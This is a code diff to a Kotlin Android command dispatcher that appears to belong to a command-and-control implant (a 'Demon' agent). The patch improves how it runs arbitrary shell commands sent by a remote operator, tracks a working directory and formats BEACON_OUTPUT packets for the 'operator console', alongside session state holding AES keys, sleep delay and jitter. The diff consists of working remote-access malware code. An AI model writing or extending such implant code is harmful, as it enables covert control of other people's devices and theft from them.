@@ -3,7 +3,6 @@ package com.demon.agent.commands
 import android.content.Context
 import android.os.Build
 import com.demon.agent.transport.*
-import kotlinx.serialization.json.*
 import java.io.File
 import java.util.UUID
 
@@ -59,12 +58,19 @@ class CommandDispatcher(private val ctx: Context, private val session: AgentSess
             }
             4  -> { // cd
                 val path = p.readString()
-                try { System.setProperty("user.dir", path); buildOutput(reqId, "Good", "[+] cd $path", "") }
-                catch (e: Exception) { buildOutput(reqId, "Error", "[-] ${e.message}", "") }
+                // Resolve relative paths against current cwd
+                val target = if (path.startsWith("/")) path
+                             else "${effectiveCwd()}/$path"
+                val dir = java.io.File(target).canonicalFile
+                return if (dir.exists() && dir.isDirectory) {
+                    session.cwd = dir.absolutePath
+                    buildOutput(reqId, "Good", dir.absolutePath, "")
+                } else {
+                    buildOutput(reqId, "Error", "[-] cd: ${dir.absolutePath}: No such directory", "")
+                }
             }
             9  -> { // pwd
-                val pwd = runShell("pwd")
-                buildOutput(reqId, "Good", pwd, "")
+                buildOutput(reqId, "Good", effectiveCwd(), "")
             }
             10 -> { // cat
                 val path = p.readString()
@@ -149,6 +155,22 @@ class CommandDispatcher(private val ctx: Context, private val session: AgentSess
                 }
 
                 android.util.Log.d("AgentService", "shell cmd: $cmd")
+
+                // Intercept `cd <path>` — shell cd is stateless across exec calls
+                val cdMatch = Regex("""^cd\s+(.+)$""").find(cmd.trim())
+                if (cdMatch != null) {
+                    val path = cdMatch.groupValues[1].trim()
+                    val target = if (path.startsWith("/")) path
+                                 else "${effectiveCwd()}/$path"
+                    val dir = java.io.File(target).canonicalFile
+                    return if (dir.exists() && dir.isDirectory) {
+                        session.cwd = dir.absolutePath
+                        buildOutput(reqId, "Good", dir.absolutePath, "")
+                    } else {
+                        buildOutput(reqId, "Error", "[-] cd: ${dir.absolutePath}: No such directory", "")
+                    }
+                }
+
                 val output = runShell(cmd)
                 buildOutput(reqId, "Good", output.ifBlank { "(no output)" }, "")
             }
@@ -206,53 +228,68 @@ class CommandDispatcher(private val ctx: Context, private val session: AgentSess
 
     // ── Helpers ───────────────────────────────────────────────────────
 
-    private fun runShell(cmd: String, timeoutMs: Long = 10_000): String {
+    /** Returns the effective working directory, initialising to app's filesDir on first call. */
+    private fun effectiveCwd(): String {
+        if (session.cwd == null) session.cwd = ctx.filesDir.absolutePath
+        return session.cwd!!
+    }
+
+    private fun runShell(cmd: String, timeoutMs: Long = 15_000): String {
         return try {
-            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
+            val workdir = java.io.File(effectiveCwd())
+            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd), null, workdir)
 
-            // Read stdout and stderr concurrently to avoid deadlock
-            val stdoutFuture = java.util.concurrent.FutureTask {
-                proc.inputStream.bufferedReader().use { it.readText() }
-            }.also { java.util.concurrent.Executors.newSingleThreadExecutor().submit(it) }
+            // Use a shared executor to avoid creating new threads per call
+            val executor = java.util.concurrent.Executors.newFixedThreadPool(2)
+            try {
+                val stdoutFuture = executor.submit(java.util.concurrent.Callable {
+                    proc.inputStream.bufferedReader().use { it.readText() }
+                })
+                val stderrFuture = executor.submit(java.util.concurrent.Callable {
+                    proc.errorStream.bufferedReader().use { it.readText() }
+                })
 
-            val stderrFuture = java.util.concurrent.FutureTask {
-                proc.errorStream.bufferedReader().use { it.readText() }
-            }.also { java.util.concurrent.Executors.newSingleThreadExecutor().submit(it) }
+                val finished = proc.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
+                if (!finished) {
+                    proc.destroyForcibly()
+                    return "[!] Command timed out after ${timeoutMs}ms"
+                }
 
-            val finished = proc.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
-            if (!finished) {
-                proc.destroyForcibly()
-                return "[!] Command timed out after ${timeoutMs}ms"
+                val out = try { stdoutFuture.get(5, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }
+                val err = try { stderrFuture.get(5, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }
+
+                val combined = (out + err).trim()
+                if (combined.length > 32_768) combined.take(32_768) + "\n[...truncated]"
+                else combined.ifBlank { "(no output)" }
+            } finally {
+                executor.shutdownNow()
             }
-
-            val out = try { stdoutFuture.get(2, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }
-            val err = try { stderrFuture.get(2, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }
-
-            // Truncate to avoid OOM with huge outputs
-            val combined = (out + err).trim()
-            if (combined.length > 32_768) combined.take(32_768) + "\n[...truncated]"
-            else combined
         } catch (e: Exception) {
             "Error executing command: ${e.message}"
         }
     }
 
     /*
-     * Build a BEACON_OUTPUT packet:
-     *   The output is a base64-encoded JSON:
-     *   { "Type": "Good|Info|Error|Warn", "Message": "...", "Output": "..." }
+     * Build a BEACON_OUTPUT packet.
+     *
+     * Server's TaskDispatch for BEACON_OUTPUT reads:
+     *   [4 BE] CALLBACK_OUTPUT sub-type (0 = plain text)
+     *   [4 BE + N] string via ParseBytes/ParseString
+     *
+     * The "message" parameter is the text shown in the operator console.
+     * "output" is appended if non-empty. "type" and "output" are not used
+     * by the server's CALLBACK_OUTPUT path — it just prints the string as-is.
      */
     fun buildOutput(reqId: Int, type: String, message: String, output: String): ByteArray {
-        val json = buildJsonObject {
-            put("Type",    type)
-            put("Message", message)
-            put("Output",  output)
-        }.toString()
-        val b64 = android.util.Base64.encodeToString(
-            json.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
+        val text = if (output.isNotBlank()) "$message\n$output" else message
 
-        // Payload = length-prefixed base64 string
-        val payload = PacketBuilder().addString(b64).build()
+        // BEACON_OUTPUT payload:
+        //   [4 BE] CALLBACK_OUTPUT = 0x0
+        //   [4 BE len][N bytes]  — plain UTF-8 string
+        val payload = PacketBuilder()
+            .addInt32(0)       // CALLBACK_OUTPUT = 0x0
+            .addString(text)
+            .build()
         return FrameBuilder.buildOutput(
             agentId   = session.agentId,
             commandId = CommandId.BEACON_OUTPUT,
@@ -282,10 +319,12 @@ class CommandDispatcher(private val ctx: Context, private val session: AgentSess
 
 // ── Session state shared between dispatcher and service ───────────────
 class AgentSession {
-    var agentId:     Int      = generateAgentId()
+    var agentId:     Int       = generateAgentId()
     var aesKey:      ByteArray = randomBytes(32)
     var aesIv:       ByteArray = randomBytes(16)
-    var sleepDelay:  Int      = 5
-    var sleepJitter: Int      = 10
-    var shouldExit:  Boolean  = false
+    var sleepDelay:  Int       = 5
+    var sleepJitter: Int       = 10
+    var shouldExit:  Boolean   = false
+    // Stateful working directory — starts at app's private files dir (SELinux-accessible)
+    var cwd:         String?   = null  // null = use app filesDir (set on first use)
 }
